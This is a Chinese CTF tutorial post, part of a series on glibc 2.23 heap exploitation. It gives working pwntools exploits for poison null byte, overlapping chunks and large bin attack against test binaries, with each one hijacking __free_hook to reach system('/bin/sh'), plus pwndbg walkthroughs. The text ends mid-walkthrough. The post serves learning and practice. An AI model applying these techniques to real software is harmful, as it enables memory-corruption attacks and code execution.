---
layout: post
title: 【pwn4heap】pwn4heap - glibc2.23其二
categories: pwn4heap
description: 深入解析 glibc2.23 Heap Technique
keywords: CTF, pwn4heap, glibc2.23
---

# pwn4heap - glibc2.23其二

在CTF竞赛体系中，pwn类题目因其直接关联底层系统安全机制，常被视为核心挑战方向。其中，堆利用技术涉及动态内存管理的复杂交互，是突破现代软件防御体系的关键路径之一。本系列聚焦于glibc 2.23环境下的堆漏洞利用方法，该版本因其广泛存在与典型性，成为相关研究的常见基础。通过系统分析与归纳，本系列整理出约43种利用技术，涵盖从基础结构破坏到高级组合利用的多种场景，旨在为后续学习、教学与实践提供结构化的参考。笔者期望借此推动该领域的技术积累与方法论沉淀，促进安全研究社区的交流与进步。


## 1. glibc2.23

### 1-8 poison null byte

本方法利用null byte制造重叠的chunk，实现evil chunk覆盖或部分覆盖normal chunk的区域，进而对normal chunk里的数据进行任意操作。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/07/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/poison_null_byte/exploit.py)。

核心利用代码如下：

```python
conn.sendlineafter(b"Enter author name: ", b"A" * 0x20)
create_book(0x80, b"B" * 0x8, 0x80, b"B" * 0x8)
create_book(0x80, b"C" * 0x8, 0x80, b"C" * 0x8)

# prepare unsorted bin leak
delete_book(2)
print_books()
conn.recvuntil(b"A" * 0x20)
heap_leak = u64(conn.recv(6).ljust(8, b"\x00"))
book1_addr = heap_leak
book2_addr = heap_leak + 0x150
log.info(f"heap leak: {hex(heap_leak)}")
log.info(f"book[0] addr: {hex(book1_addr)}")
log.info(f"book[1] addr: {hex(book2_addr)}")

payload = b"D" * 0x60
# build fake book
payload += p64(1) + p64(book2_addr - 0x120) + p64(book2_addr + 0x10) + p64(0x1000)
edit_book(1, payload)
# poison null byte leak
change_author(b"A" * 0x20)

# read unsorted bin fd
print_books()
conn.recvuntil(b"Name: ")
main_arena88_leak = u64(conn.recv(6).ljust(8, b"\x00"))
libc.address = main_arena88_leak - 0x38DB78
log.info(f"main_arena+88 leak: {hex(main_arena88_leak)}")
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

# retrieve books[1] = (book2_addr)
create_book(0x80, b"C" * 0x8, 0x80, b"C" * 0x8)
edit_book(1, p64(libc.sym["__free_hook"]))
edit_book(2, p64(libc.sym["system"]))
edit_book(1, p64(binsh_addr))
delete_book(2)
cmd = b"cat src/2.23/poison_null_byte/flag\x00"
conn.sendline(cmd)
conn.recvline()
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

测试二进制存在一个明显的漏洞，当author_name输入长度出现off-by-one时，正好可以覆盖books结构指针的最低有效位，实现重叠chunk的效果。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x61359f814000
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x61359f814090
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x61359f814120
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x61359f814150
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x61359f8141e0
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x61359f814270
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x61359f8142a0
Size: 0x20d60 (with flag bits: 0x20d61)

pwndbg> x/8gx author_name
0x61356eb11080 <author_name>:    0x4141414141414141      0x4141414141414141 <= author_name
0x61356eb11090 <author_name+16>: 0x4141414141414141      0x4141414141414141
0x61356eb110a0 <books>:          0x000061359f814130      0x000061359f814280 <= books[0]   books[1]
0x61356eb110b0 <books+16>:       0x0000000000000000      0x0000000000000000
pwndbg>  p/x *(struct book_t*)0x61359f814130
$1 = {
  id = 0x1,
  name = 0x61359f814010,
  desc = 0x61359f8140a0,
  desc_size = 0x80
}
pwndbg>  p/x *(struct book_t*)0x61359f814280
$2 = {
  id = 0x2,
  name = 0x61359f814160,
  desc = 0x61359f8141f0,
  desc_size = 0x80
}
```

可以直观观察到测试二进制相关数据结构布局。首先泄露books数组的指针，为后续操作提供基础。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x61359f814000
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x61359f814090
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x61359f814120
Size: 0x30 (with flag bits: 0x31)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x61359f814150
Size: 0x120 (with flag bits: 0x121)
fd: 0x72bb71b8db78
bk: 0x72bb71b8db78

Free chunk (fastbins)
Addr: 0x61359f814270
Size: 0x30 (with flag bits: 0x30)
fd: 0x00

Top chunk | PREV_INUSE
Addr: 0x61359f8142a0
Size: 0x20d60 (with flag bits: 0x20d61)

pwndbg> fastbins 
fastbins
0x30: 0x61359f814270 ◂— 0
pwndbg> unsortedbin 
unsortedbin
all: 0x61359f814150 —▸ 0x72bb71b8db78 (main_arena+88) ◂— 0x61359f814150
```

释放books[1]指针，产生unsortedbin为后续泄露libc地址做好准备。

```bash
pwndbg> p/x *(struct book_t*)books[0]
$3 = {
  id = 0x1,
  name = 0x61359f814010,
  desc = 0x61359f8140a0,
  desc_size = 0x80
}
pwndbg> p/x books[0]             
$4 = 0x61359f814130
pwndbg> p/x *(struct book_t*)0x61359f814100
$5 = {
  id = 0x1,
  name = 0x61359f814160,
  desc = 0x61359f814290,
  desc_size = 0x1000
}
pwndbg> x/22gx 0x61359f8140a0
0x61359f8140a0: 0x4444444444444444      0x4444444444444444
0x61359f8140b0: 0x4444444444444444      0x4444444444444444
0x61359f8140c0: 0x4444444444444444      0x4444444444444444
0x61359f8140d0: 0x4444444444444444      0x4444444444444444
0x61359f8140e0: 0x4444444444444444      0x4444444444444444
0x61359f8140f0: 0x4444444444444444      0x4444444444444444
0x61359f814100: 0x0000000000000001      0x000061359f814160  <= fake_book.id   fake_book.name
0x61359f814110: 0x000061359f814290      0x0000000000001000  <= fake_book.desc fake_book.desc_size
0x61359f814120: 0x0000000000000000      0x0000000000000031
0x61359f814130: 0x0000000000000001      0x000061359f814010  <= books[0].id    books[id].name
0x61359f814140: 0x000061359f8140a0      0x0000000000000080  <= books[0].desc  books[id].desc_size
```

在books[0]中伪造fake book，其布局是经过深思熟虑的。heap内存是从低往高处增加的，目标通过author_name溢出null byte到books[0]，使其books[0]指针往前移动若干字节，移动的长度不定，但是最低有效位一定为\x00。

```bash
pwndbg> fastbins 
fastbins
0x30: 0x61359f814270 ◂— 0
pwndbg> unsortedbin 
unsortedbin
all: 0x61359f814150 —▸ 0x72bb71b8db78 (main_arena+88) ◂— 0x61359f814150
pwndbg> 
```

fake book的name正好位于unsortedbin，据此可以泄露libc地址。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x61359f814000
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x61359f814090
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x61359f814120
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x61359f814150
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x61359f8141e0
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x61359f814270
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x61359f8142a0
Size: 0x20d60 (with flag bits: 0x20d61)

pwndbg> x/8gx author_name 
0x61356eb11080 <author_name>:    0x4141414141414141      0x4141414141414141
0x61356eb11090 <author_name+16>: 0x4141414141414141      0x4141414141414141
0x61356eb110a0 <books>:          0x000061359f814100      0x000061359f814280 <= books[0]   books[1]
0x61356eb110b0 <books+16>:       0x0000000000000000      0x0000000000000000
pwndbg> p/x *(struct book_t*)0x000061359f814100
$6 = {
  id = 0x1,
  name = 0x61359f814160,
  desc = 0x61359f814290,
  desc_size = 0x1000
}
pwndbg> p/x *(struct book_t*)0x000061359f814280
$7 = {
  id = 0x2,
  name = 0x61359f814160,
  desc = 0x72bb71b8f7c8,
  desc_size = 0x0
}
```

重新申请books[1]，由于book[0]控制着books[1]的区域，加上已经获取libc地址，可以实现任意地址读写。

```bash
pwndbg> p/x *(struct book_t*)0x000061359f814100
$21 = {
  id = 0x1,
  name = 0x61359f814160,
  desc = 0x61359f814290,
  desc_size = 0x1000
}
pwndbg> p/x *(struct book_t*)0x000061359f814280
$22 = {
  id = 0x2,
  name = 0x61359f814160,
  desc = 0x72bb71b8f7c8,
  desc_size = 0x0
}
pwndbg> x/1gx 0x72bb71b8f7c8
0x72bb71b8f7c8 <__free_hook>:   0x0000000000000000
```

可以发现books[1].desc已经成功修改为__free_hook的地址。此时，编辑books[1].desc即可将__free_hook修改为system，进而获取shell就变得相当容易。


### 1-9 overlapping chunks

本方法利用off-by-one增加victim chunk的尺寸大小，实现evil chunk覆盖或部分覆盖normal chunk的区域，进而对normal chunk里的数据进行任意操作。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/08/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/overlapping_chunks/exploit.py)。

核心利用代码如下：

```python
fixed_cost = 0x10
# overlapping chunks
malloc(0, 0x100 - 0x8 - fixed_cost, b"A" * 0x8)
malloc(1, 0x100 - 0x8 - fixed_cost, b"B" * 0x8)
malloc(2, 0x80 - 0x8 - fixed_cost, b"C" * 0x8)
malloc(3, 0x80 - 0x8 - fixed_cost, b"D" * 0x8)
delete(1)
payload = b"A" * (0x100 - 0x8) + b"\x81"
edit(0, len(payload), payload)
malloc(4, (0x100 + 0x80 - 0x10 - fixed_cost), b"B" * 0x8)
payload = b"B" * (0x100 - 0x8 - 0x8) + p64(0x110) + b"\x91"
edit(3, len(payload), payload)
delete(1)
payload = b"B" * 0x100
edit(2, len(payload), payload)
show(2)
conn.recvuntil(b"B" * 0x100)
main_arena88_leak = u64(conn.recv(6).ljust(8, b"\x00"))
libc.address = main_arena88_leak - 0x38DB78
log.info(f"main_arena+88 leak: {hex(main_arena88_leak)}")
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system addr: {hex(libc.sym['system'])}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")
# restore deleted chunk 2
payload = b"B" * (0x100 - 0x8 - 0x8) + p64(0x110) + p64(0x91)
edit(2, len(payload), payload)
malloc(5, 0x80 - 0x8 - fixed_cost, b"E" * 0x8)
# increase the total_chunks, bypass is_valid_index check
malloc(6, 0x80 - 0x8 - fixed_cost, b"F" * 0x8)
payload = b"B" * (0x100 - 0x8 - 0x8)
payload += p64(0x110) + p64(0x91) + p64(libc.sym["__free_hook"] - 0x20)
edit(2, len(payload), payload)
payload = p64(0) + p64(0) + p64(libc.sym["system"]) + p64(0x20)
edit(4, len(payload), payload)
payload = b"B" * (0x100 - 0x8 - 0x8) + p64(0x110) + p64(0x91)
payload += b"/bin/sh\x00" + p64(0)
edit(2, len(payload), payload)
delete(3)
cmd = b"cat src/2.23/overlapping_chunks/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

测试二进制通过手工实现单链表演示此次技术，链表结构如下：

```C
// Linked list node structure
struct chunk_t {
  struct chunk_t *next;
  uint64_t data_size;
  char data[];
} __attribute__((aligned(16)));
```

连续申请chunkA、chunkB、chunkC、chunkD，heap结构布局如下:

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x586c5f349000
Size: 0x110 (with flag bits: 0x111)

Allocated chunk | PREV_INUSE
Addr: 0x586c5f349110
Size: 0x110 (with flag bits: 0x111)

Allocated chunk | PREV_INUSE
Addr: 0x586c5f349220
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE
Addr: 0x586c5f3492b0
Size: 0x90 (with flag bits: 0x91)

Top chunk | PREV_INUSE
Addr: 0x586c5f349340
Size: 0x20cc0 (with flag bits: 0x20cc1)
pwndbg> 

0 -> 1 -> 2 - > 3
0x586c5f349000 -> 0x586c5f349110 -> 0x586c5f349220 -> 0x586c5f3492b0
```

接着释放node[1]，heap结构布局如下:

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x586c5f349000
Size: 0x110 (with flag bits: 0x111)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x586c5f349110
Size: 0x110 (with flag bits: 0x111)
fd: 0x77c41258db78
bk: 0x77c41258db78

Allocated chunk
Addr: 0x586c5f349220
Size: 0x90 (with flag bits: 0x90)

Allocated chunk | PREV_INUSE
Addr: 0x586c5f3492b0
Size: 0x90 (with flag bits: 0x91)

Top chunk | PREV_INUSE
Addr: 0x586c5f349340
Size: 0x20cc0 (with flag bits: 0x20cc1)

pwndbg> unsortedbin 
unsortedbin
all: 0x586c5f349110 —▸ 0x77c41258db78 (main_arena+88) ◂— 0x586c5f349110
pwndbg> 

0 -> 2 - > 3
0x586c5f349000 -> 0x586c5f349220 -> 0x586c5f3492b0
```

此时编辑node[0]，使得0x586c5f349110chunk尺寸增大至0x181。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x586c5f349000
Size: 0x110 (with flag bits: 0x111)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x586c5f349110
Size: 0x180 (with flag bits: 0x181)
fd: 0x77c41258db78
bk: 0x77c41258db78

Allocated chunk
Addr: 0x586c5f349290
Size: 0x00 (with flag bits: 0x00)

pwndbg> unsortedbin 
unsortedbin
all: 0x586c5f349110 —▸ 0x77c41258db78 (main_arena+88) ◂— 0x586c5f349110
pwndbg> 
```

此时申请node[4]，便是增大尺寸的0x586c5f349110chunk。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x586c5f349000
Size: 0x110 (with flag bits: 0x111)

Allocated chunk | PREV_INUSE
Addr: 0x586c5f349110
Size: 0x180 (with flag bits: 0x181)

Allocated chunk | PREV_INUSE
Addr: 0x586c5f349290
Size: 0x00 (with flag bits: 0x01)

pwndbg> x/40gx 0x586c5f349110
0x586c5f349110: 0x4141414141414141      0x0000000000000181
0x586c5f349120: 0x0000000000000000      0x0000000000000160
0x586c5f349130: 0x4242424242424242      0x0000000000000000
...
0x586c5f349220: 0x0000000000000110      0x0000000000000090
0x586c5f349230: 0x0000586c5f3492c0      0x0000000000000068
0x586c5f349240: 0x4343434343434343      0x0000000000000000
pwndbg> 

0 -> 2 - > 3 -> 4
0x586c5f349000 -> 0x586c5f349220 -> 0x586c5f3492b0 -> 0x586c5f349110
```

修改 node[2]的prev_in_use为true。

```bash
pwndbg> x/40gx 0x586c5f349110
0x586c5f349110: 0x4141414141414141      0x0000000000000181
0x586c5f349120: 0x0000000000000000      0x00000000000000f9
0x586c5f349130: 0x4242424242424242      0x4242424242424242
...
0x586c5f349220: 0x0000000000000110      0x0000000000000091 <= fix prev_in_use 90 -> 91
0x586c5f349230: 0x0000586c5f3492c0      0x0000000000000068
0x586c5f349240: 0x4343434343434343      0x0000000000000000
pwndbg> 
```

接着释放node[2]，heap结构布局如下：

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x586c5f349220 —▸ 0x77c41258db78 (main_arena+88) ◂— 0x586c5f349220
pwndbg> 

0 - > 3 -> 4
0x586c5f349000 -> 0x586c5f3492b0 -> 0x586c5f349110
```

由于node[4]覆盖node[2]部分范围，可以利用这个泄露libc地址。

```bash
pwndbg> x/40gx 0x586c5f349110
0x586c5f349110: 0x4141414141414141      0x0000000000000181
0x586c5f349120: 0x0000000000000000      0x00000000000000f9
0x586c5f349130: 0x4242424242424242      0x4242424242424242
...
0x586c5f349220: 0x4242424242424242      0x4242424242424242
0x586c5f349230: 0x000077c41258db78      0x000077c41258db78
0x586c5f349240: 0x4343434343434343      0x0000000000000000
pwndbg>
```

接着还原node[2]的chunk结构。

```bash
pwndbg> x/40gx 0x586c5f349110
0x586c5f349110: 0x4141414141414141      0x0000000000000181
0x586c5f349120: 0x0000000000000000      0x00000000000000f9
0x586c5f349130: 0x4242424242424242      0x4242424242424242
...
0x586c5f349220: 0x0000000000000110      0x0000000000000091
0x586c5f349230: 0x000077c41258db78      0x000077c41258db78
0x586c5f349240: 0x4343434343434343      0x0000000000000000
pwndbg> 
```

申请node[5]，取出unsortedbin内的chunk。

```bash
0 - > 3 -> 4 -> 5
0x586c5f349000 -> 0x586c5f3492b0 -> 0x586c5f349110 -> 0x586c5f349220
```

接着再申请一个额外的node，用来绕过is_valid_index检查。

```bash
pwndbg> p/x *(struct chunk_t*)0x586c5f349230
$1 = {
  next = 0x586c5f349350,
  data_size = 0x68,
  data = 0x586c5f349240
}
pwndbg> 
0 - > 3 -> 4 -> 5 -> 6
0x586c5f349000 -> 0x586c5f3492b0 -> 0x586c5f349110 -> 0x586c5f349220 -> 0x0000586c5f349350
```

编辑node[4]，修改node[5].next为__free_hook-0x20

```bash
pwndbg> p/x *(struct chunk_t*)0x586c5f349230
$2 = {
  next = 0x77c41258f7a8,
  data_size = 0x68,
  data = 0x586c5f349240
}
pwndbg> x/8gx 0x77c41258f7a8-0x10
0x77c41258f798 <_IO_stdfile_2_lock+8>:  0x0000000000000000      0x0000000000000000
0x77c41258f7a8 <_IO_stdfile_1_lock+8>:  0x0000000000000000      0x0000000000000000
0x77c41258f7b8 <_IO_stdfile_0_lock+8>:  0x0000000000000000      0x0000000000000000
0x77c41258f7c8 <__free_hook>:           0x0000000000000000      0x0000000000000000
pwndbg> 

0 - > 3 -> 4 -> 5 -> fake chunk_t
0x586c5f349000 -> 0x586c5f3492b0 -> 0x586c5f349110 -> 0x586c5f349220 -> 0x77c41258f798
```

接着修改fake chunk_t里__free_hook为system地址，进而获取shell。


### 1-10 large bin attack其一

本方法利用glibc对于large bin管理缺陷而实现恶意操作。相关glibc完整源码参见[malloc.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579)

```C
for (;; )
  {
    int iters = 0;
    while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
      {
        bck = victim->bk;
        if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
            || __builtin_expect (victim->size > av->system_mem, 0))
          malloc_printerr (check_action, "malloc(): memory corruption",
                           chunk2mem (victim), av);
        size = chunksize (victim);

        /*
           If a small request, try to use last remainder if it is the
           only chunk in unsorted bin.  This helps promote locality for
           runs of consecutive small requests. This is the only
           exception to best-fit, and applies only when there is
           no exact fit for a small chunk.
         */

        if (in_smallbin_range (nb) &&
            bck == unsorted_chunks (av) &&
            victim == av->last_remainder &&
            (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
          {
            /* split and reattach remainder */
            remainder_size = size - nb;
            remainder = chunk_at_offset (victim, nb);
            unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
            av->last_remainder = remainder;
            remainder->bk = remainder->fd = unsorted_chunks (av);
            if (!in_smallbin_range (remainder_size))
              {
                remainder->fd_nextsize = NULL;
                remainder->bk_nextsize = NULL;
              }

            set_head (victim, nb | PREV_INUSE |
                      (av != &main_arena ? NON_MAIN_ARENA : 0));
            set_head (remainder, remainder_size | PREV_INUSE);
            set_foot (remainder, remainder_size);

            check_malloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb (p, bytes);
            return p;
          }

        /* remove from unsorted list */
        unsorted_chunks (av)->bk = bck;
        bck->fd = unsorted_chunks (av);

        /* Take now instead of binning if exact fit */

        if (size == nb)
          {
            set_inuse_bit_at_offset (victim, size);
            if (av != &main_arena)
              victim->size |= NON_MAIN_ARENA;
            check_malloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb (p, bytes);
            return p;
          }

        /* place chunk in bin */

        if (in_smallbin_range (size))
          {
            victim_index = smallbin_index (size);
            bck = bin_at (av, victim_index);
            fwd = bck->fd;
          }
        else
          {
            victim_index = largebin_index (size);
            bck = bin_at (av, victim_index);
            fwd = bck->fd;

            /* maintain large bins in sorted order */
            if (fwd != bck)
              {
                /* Or with inuse bit to speed comparisons */
                size |= PREV_INUSE;
                /* if smaller than smallest, bypass loop below */
                assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
                if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
                  {
                    fwd = bck;
                    bck = bck->bk;

                    victim->fd_nextsize = fwd->fd;
                    victim->bk_nextsize = fwd->fd->bk_nextsize;
                    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                  }
                else
                  {
                    assert ((fwd->size & NON_MAIN_ARENA) == 0);
                    while ((unsigned long) size < fwd->size)
                      {
                        fwd = fwd->fd_nextsize;
                        assert ((fwd->size & NON_MAIN_ARENA) == 0);
                      }

                    if ((unsigned long) size == (unsigned long) fwd->size)
                      /* Always insert in the second position.  */
                      fwd = fwd->fd;
                    else
                      {
                        victim->fd_nextsize = fwd;
                        victim->bk_nextsize = fwd->bk_nextsize;
                        fwd->bk_nextsize = victim;
                        victim->bk_nextsize->fd_nextsize = victim;   <= bug
                      }
                    bck = fwd->bk;
                  }
              }
            else
              victim->fd_nextsize = victim->bk_nextsize = victim;
          }

        mark_bin (av, victim_index);
        victim->bk = bck;
        victim->fd = fwd;
        fwd->bk = victim;
        bck->fd = victim;   <= bug

#define MAX_ITERS       10000
        if (++iters >= MAX_ITERS)
          break;
      }
```

large bin涉及的bug存在于两个地方，分别为`victim->bk_nextsize->fd_nextsize = victim;`与`bck->fd = victim;`。实现的效果是普通的unsorted bin attack的两倍，毕竟可以同时修改任意位置内容两次。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/04/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/large_bin_attack/exploit.py)。

核心利用代码如下：

```python
# large bin attack
malloc(0, 0x420, b"A" * 0x8)
malloc(1, 0x20, b"A" * 0x8)
malloc(2, 0x500, b"B" * 0x8)
malloc(3, 0x20, b"B" * 0x8)
malloc(4, 0x500, b"C" * 0x8)
malloc(5, 0x20, b"C" * 0x8)
delete(0)
delete(2)
show(0)
main_arena88_leak = u64(conn.recv(6).ljust(8, b"\x00"))
log.info(f"main_arena+88 leak: {hex(main_arena88_leak)}")
edit(0, 0x8, b"A" * 0x8)
show(0)
conn.recvuntil(b"A" * 0x8)
chunk2_addr = u64(conn.recv(4).ljust(8, b"\x00"))
chunk4_addr = chunk2_addr + 0x510 + 0x30
log.info(f"chunk2 addr leak: {hex(chunk2_addr)}")
log.info(f"chunk4 addr leak: {hex(chunk4_addr)}")
edit(0, 0x8, p64(main_arena88_leak))

malloc(6, 0x90, b"D" * 0x8)
delete(4)
# 004041e0  uint64_t magic = 0x0
magic = 0x004041E0
payload = b"A" * 0x28 + p64(0x3F1)
payload += p64(0) + p64(magic - 0x10) + p64(0) + p64(magic - 0x20)
edit(1, len(payload), payload)
malloc(7, 0x90, b"E" * 0x8)
use_magic(chunk4_addr)
cmd = b"cat src/2.23/large_bin_attack/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

连续申请chunkA、chunkB、chunkC及其栅栏chunk。相关heap结构布局如下:

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x18585000
Size: 0x430 (with flag bits: 0x431)

Allocated chunk | PREV_INUSE
Addr: 0x18585430
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x18585460
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x18585970
Size: 0x30 (with flag bits: 0x31)

Allocated chunk | PREV_INUSE
Addr: 0x185859a0
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x18585eb0
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x18585ee0
Size: 0x20120 (with flag bits: 0x20121)

pwndbg> 
```

连续释放chunkA、chunkB，将其推入unsortedbin中，为接下来泄露heap和libc做好准备。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x18585460 —▸ 0x18585000 —▸ 0x7d2e9a18db78 (main_arena+88) ◂— 0x18585460
pwndbg> x/4gx 0x18585460
0x18585460:     0x703698ab9440870d      0x0000000000000511
0x18585470:     0x0000000018585000      0x00007d2e9a18db78
pwndbg> x/4gx 0x18585000
0x18585000:     0x0000000000000000      0x0000000000000431
0x18585010:     0x00007d2e9a18db78      0x0000000018585460
pwndbg> 
```

接着申请chunkD，将切割chunkA为两部分，一部分留在unsortedbin，一部分返回给chunkD。而chunkB被移动至largebins。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x18585000
Size: 0xa0 (with flag bits: 0xa1)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x185850a0
Size: 0x390 (with flag bits: 0x391)
fd: 0x7d2e9a18db78
bk: 0x7d2e9a18db78

Allocated chunk
Addr: 0x18585430
Size: 0x30 (with flag bits: 0x30)

Free chunk (largebins) | PREV_INUSE
Addr: 0x18585460
Size: 0x510 (with flag bits: 0x511)
fd: 0x7d2e9a18dfa8
bk: 0x7d2e9a18dfa8
fd_nextsize: 0x18585460
bk_nextsize: 0x18585460

Allocated chunk
Addr: 0x18585970
Size: 0x30 (with flag bits: 0x30)

Allocated chunk | PREV_INUSE
Addr: 0x185859a0
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x18585eb0
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x18585ee0
Size: 0x20120 (with flag bits: 0x20121)

pwndbg> unsortedbin 
unsortedbin
all: 0x185850a0 —▸ 0x7d2e9a18db78 (main_arena+88) ◂— 0x185850a0
pwndbg> largebins 
largebins
0x500-0x530: 0x18585460 —▸ 0x7d2e9a18dfa8 (main_arena+1160) ◂— 0x18585460
pwndbg> 
```

这时释放chunkC，将移动至unsortedbin。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x185859a0 —▸ 0x185850a0 —▸ 0x7d2e9a18db78 (main_arena+88) ◂— 0x185859a0
pwndbg> largebins 
largebins
0x500-0x530: 0x18585460 —▸ 0x7d2e9a18dfa8 (main_arena+1160) ◂— 0x18585460
pwndbg> x/6gx 0x18585460
0x18585460:     0x703698ab9440870d      0x0000000000000511
0x18585470:     0x00007d2e9a18dfa8      0x00007d2e9a18dfa8
0x18585480:     0x0000000018585460      0x0000000018585460
pwndbg> 
```

接着修改chunkB的size、bk、bk_nextsize，其中bk与bk_nextsize作为利用点可以首先任意地址写，但是内容不可控。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x185859a0 —▸ 0x185850a0 —▸ 0x7d2e9a18db78 (main_arena+88) ◂— 0x185859a0
pwndbg> largebins 
largebins
0x500-0x530 [corrupted]
FD: 0x18585460 ◂— 0
BK: 0x18585460 —▸ 0x4041d0 (chunks+240) ◂— 0
pwndbg> x/6gx 0x18585460
0x18585460:     0x4141414141414141      0x00000000000003f1
0x18585470:     0x0000000000000000      0x00000000004041d0
0x18585480:     0x0000000000000000      0x00000000004041c0
pwndbg> 
```

申请chunkE触发large bin attack。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3472
   3466 
   3467   for (;; )
   3468     {
   3469       int iters = 0;
   3470       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
   3471         {
 ► 3472           bck = victim->bk;
 
pwndbg> p/x victim
$1 = 0x185850a0
pwndbg> p/x victim->bk
$2 = 0x185859a0
pwndbg> p/x bck
$3 = 0x185859a0
```

进入第一次循环。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3521
   3515           /* remove from unsorted list */
   3516           unsorted_chunks (av)->bk = bck;
   3517           bck->fd = unsorted_chunks (av);
   3518 
   3519           /* Take now instead of binning if exact fit */
   3520 
 ► 3521           if (size == nb)
   3522             {
   3523               set_inuse_bit_at_offset (victim, size);
   
pwndbg> unsortedbin 
unsortedbin
all: 0x185859a0 —▸ 0x7d2e9a18db78 (main_arena+88) ◂— 0x185859a0
pwndbg> 
pwndbg> p/x size
$8 = 0x390
pwndbg> p/x nb
$9 = 0xa0
```

提取unsortedbin里0x185850a0准备作为此次申请的内容，但是尺寸远大与需要的的内容，跳过`if (size == nb)`条件。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3534
   3528               alloc_perturb (p, bytes);
   3529               return p;
   3530             }
   3531 
   3532           /* place chunk in bin */
   3533 
 ► 3534           if (in_smallbin_range (size))
   3535             {
   3536               victim_index = smallbin_index (size);
   3537               bck = bin_at (av, victim_index);
   3538               fwd = bck->fd;
```

满足small bin尺寸要求，于是0x185850a0移动至small bin。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3595
   3589           victim->bk = bck;
   3590           victim->fd = fwd;
   3591           fwd->bk = victim;
   3592           bck->fd = victim;
   3593 
   3594 #define MAX_ITERS       10000
 ► 3595           if (++iters >= MAX_ITERS)
 
pwndbg> smallbins 
smallbins
0x390: 0x185850a0 —▸ 0x7d2e9a18def8 (main_arena+984) ◂— 0x185850a0
pwndbg> 
```

接着进入第二次循环。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3472
   3466 
